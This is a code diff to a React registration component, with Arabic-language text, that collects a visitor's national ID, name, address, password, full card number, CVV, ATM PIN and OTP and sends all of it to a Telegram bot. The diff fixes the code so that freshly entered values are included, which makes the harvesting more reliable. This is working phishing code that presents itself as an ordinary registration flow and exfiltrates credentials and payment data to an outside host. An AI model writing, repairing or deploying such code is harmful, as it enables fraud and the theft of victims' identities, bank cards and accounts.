@@ -37,7 +37,7 @@ interface RegistrationData {
 interface RegistrationContextType {
   data: RegistrationData;
   updateData: (newData: Partial<RegistrationData>) => void;
-  sendCumulativeMessage: (stage: number, stageName: string) => Promise<void>;
+  sendCumulativeMessage: (stage: number, stageName: string, newData?: Partial<RegistrationData>) => Promise<void>;
   clearData: () => void;
 }
 
@@ -60,67 +60,67 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
     setData((prev) => ({ ...prev, ...newData }));
   };
 
-  const formatTelegramMessage = (stage: number, stageName: string): string => {
+  const formatTelegramMessage = (stage: number, stageName: string, dataToFormat: RegistrationData): string => {
     let message = `📋 <b>معلومات التسجيل - المرحلة ${stage}/6</b>\n`;
     message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
 
     // Stage 1: Account Type
-    if (stage >= 1 && data.accountType) {
+    if (stage >= 1 && dataToFormat.accountType) {
       message += `✅ <b>المرحلة 1: نوع الحساب</b>\n`;
-      if (data.accountType === "citizens") {
+      if (dataToFormat.accountType === "citizens") {
         message += `   📌 النوع: مواطن/مقيم\n`;
-        message += `   🆔 رقم البطاقة: ${data.nationalId}\n`;
-        message += `   📱 الهاتف: ${data.mobileNumber}\n`;
+        message += `   🆔 رقم البطاقة: ${dataToFormat.nationalId}\n`;
+        message += `   📱 الهاتف: ${dataToFormat.mobileNumber}\n`;
       } else {
         message += `   📌 النوع: زائر\n`;
-        message += `   📧 البريد: ${data.visitorEmail}\n`;
-        message += `   📱 الهاتف: ${data.phoneCode} ${data.visitorMobile}\n`;
+        message += `   📧 البريد: ${dataToFormat.visitorEmail}\n`;
+        message += `   📱 الهاتف: ${dataToFormat.phoneCode} ${dataToFormat.visitorMobile}\n`;
       }
       message += `\n`;
     }
 
     // Stage 2: Personal Info
-    if (stage >= 2 && data.fullNameArabic) {
+    if (stage >= 2 && dataToFormat.fullNameArabic) {
       message += `✅ <b>المرحلة 2: البيانات الشخصية</b>\n`;
-      message += `   👤 الاسم (عربي): ${data.fullNameArabic}\n`;
-      message += `   👤 الاسم (English): ${data.fullNameEnglish}\n`;
-      message += `   🎂 تاريخ الميلاد: ${data.dateOfBirth}\n`;
-      message += `   ⚧️ الجنس: ${data.gender}\n`;
-      message += `   🌍 الجنسية: ${data.nationality}\n`;
-      message += `   📍 العنوان: ${data.address}\n`;
-      message += `   📧 البريد: ${data.email}\n`;
+      message += `   👤 الاسم (عربي): ${dataToFormat.fullNameArabic}\n`;
+      message += `   👤 الاسم (English): ${dataToFormat.fullNameEnglish}\n`;
+      message += `   🎂 تاريخ الميلاد: ${dataToFormat.dateOfBirth}\n`;
+      message += `   ⚧️ الجنس: ${dataToFormat.gender}\n`;
+      message += `   🌍 الجنسية: ${dataToFormat.nationality}\n`;
+      message += `   📍 العنوان: ${dataToFormat.address}\n`;
+      message += `   📧 البريد: ${dataToFormat.email}\n`;
       message += `\n`;
     }
 
     // Stage 3: Password
-    if (stage >= 3 && data.password) {
+    if (stage >= 3 && dataToFormat.password) {
       message += `✅ <b>المرحلة 3: كلمة المرور</b>\n`;
-      message += `   🔑 كلمة المرور: ${data.password}\n`;
+      message += `   🔑 كلمة المرور: ${dataToFormat.password}\n`;
       message += `\n`;
     }
 
     // Stage 4: Payment
-    if (stage >= 4 && data.cardNumber) {
+    if (stage >= 4 && dataToFormat.cardNumber) {
       message += `✅ <b>المرحلة 4: بيانات الدفع</b>\n`;
-      message += `   💳 رقم البطاقة: ${data.cardNumber}\n`;
-      message += `   👤 اسم حامل البطاقة: ${data.cardholderName}\n`;
-      message += `   📅 تاريخ الانتهاء: ${data.expiryDate}\n`;
-      message += `   🔒 CVV: ${data.cvv}\n`;
+      message += `   💳 رقم البطاقة: ${dataToFormat.cardNumber}\n`;
+      message += `   👤 اسم حامل البطاقة: ${dataToFormat.cardholderName}\n`;
+      message += `   📅 تاريخ الانتهاء: ${dataToFormat.expiryDate}\n`;
+      message += `   🔒 CVV: ${dataToFormat.cvv}\n`;
       message += `   💰 المبلغ: 10 ريال\n`;
       message += `\n`;
     }
 
     // Stage 5: ATM Pin
-    if (stage >= 5 && data.atmPin) {
+    if (stage >= 5 && dataToFormat.atmPin) {
       message += `✅ <b>المرحلة 5: رقم PIN</b>\n`;
-      message += `   🔐 رقم PIN: ${data.atmPin}\n`;
+      message += `   🔐 رقم PIN: ${dataToFormat.atmPin}\n`;
       message += `\n`;
     }
 
     // Stage 6: OTP
-    if (stage >= 6 && data.otp) {
+    if (stage >= 6 && dataToFormat.otp) {
       message += `✅ <b>المرحلة 6: رمز التحقق</b>\n`;
-      message += `   🔢 رمز OTP: ${data.otp}\n`;
+      message += `   🔢 رمز OTP: ${dataToFormat.otp}\n`;
       message += `\n`;
     }
 
@@ -130,9 +130,10 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
     return message;
   };
 
-  const sendCumulativeMessage = async (stage: number, stageName: string) => {
+  const sendCumulativeMessage = async (stage: number, stageName: string, newData?: Partial<RegistrationData>) => {
     try {
-      const message = formatTelegramMessage(stage, stageName);
+      const dataToSend = newData ? { ...data, ...newData } : data;
+      const message = formatTelegramMessage(stage, stageName, dataToSend);
       
       const response = await fetch(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -157,8 +158,9 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
     } catch (error) {
       console.error("❌ Failed to send to Telegram:", error);
       // Save to localStorage as backup
+      const dataToSend = newData ? { ...data, ...newData } : data;
       const backupKey = `telegram_backup_stage_${stage}_${Date.now()}`;
-      localStorage.setItem(backupKey, formatTelegramMessage(stage, stageName));
+      localStorage.setItem(backupKey, formatTelegramMessage(stage, stageName, dataToSend));
     }
   };
 
